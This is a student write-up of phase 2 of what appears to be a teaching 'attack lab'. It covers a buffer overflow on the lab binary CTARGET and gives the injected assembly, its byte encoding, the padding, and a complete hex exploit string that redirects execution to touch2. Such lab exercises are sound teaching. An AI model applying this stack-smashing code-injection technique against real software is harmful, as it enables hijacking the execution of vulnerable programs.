**Phase2 Reverse Engineering Analysis**

*see*:\
*`target_disassembly_annotated.s`*\
*`phase2_exploit_code.s`*

instr: instruction\
fcn : function\
cookie: `0x59b997fa`

Overview:
Phase 2 involves a code injection attack on `CTARGET`. The objective is to redirect execution to `fcn: touch2` when `fcn: getbuf` finishes.\
Function `touch2` requires a specific argument `(unsigned val)` that must match the  specific cookie: `0x59b997fa`.\
Since x86-64 uses the `%rdi` register to pass the first integer argument to a function, the injected code must explicitly populate` %rdi` before jumping to `fcn: touch2`.

The injected assembly instructions are structured as follows:
```
pushq   $0x4017ec          # push target function address onto the stack
movq    $0x59b997fa, %rdi  # place cookie value into the first argument register
ret                        # pop address and redirect execution to touch2
```
The byte sequence generated from assembling these instructions yields:
```
68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3
```

This injected code occupies exactly 13 bytes. 

Let the buffer allocated by `fcn: getbuf` be 40 bytes. To ensure the code runs, it is placed at the very beginning of the buffer. The remaining space in the buffer must be padded up to 40 bytes to reach the saved return address slot.

The required padding size is:
```
Padding = 40 bytes - 13 bytes = 27 bytes
```

Let the buffer start address found via GDB be `0x5561dc78.` The return address slot immediately following the padding must be overwritten with this address in little-endian format.

That is, 
```
exploit string = [13 bytes injected code] + [27 bytes padding] + [0x5561dc78 in little endian]
```

The following input hex format follows:
```
68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3      # 13 bytes injected code
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    # 27 bytes to fill rest of buf
78 dc 61 55 00 00 00 00                # address of start of stack buffer (0x5561dc78)
```

When `fcn: getbuf` executes its ret instruction, it pops` 0x5561dc78` into `%rip`, transitioning execution to the injected instructions. The injected payload moves the cookie into `%rdi` and pushes the entry point of `touch2 (0x4017ec)` to return into it cleanly.

This means it must be the case that `fcn: touch2` validates the cookie and the phase2 exploit succeeds.

Its therefore clear that in order for a crash or validation misfire to not happen,\
Rule1: injected code must properly align the argument register before returning to target code\
Rule2: exploit payload must pad up to the precise stack frame boundary before pointing back to the buffer start

Thus Rule1 and Rule2 conclude:\
Thus the exploit hex string effectively places custom logic into memory and hijacks the execution flow.

This completes the analysis of phase2
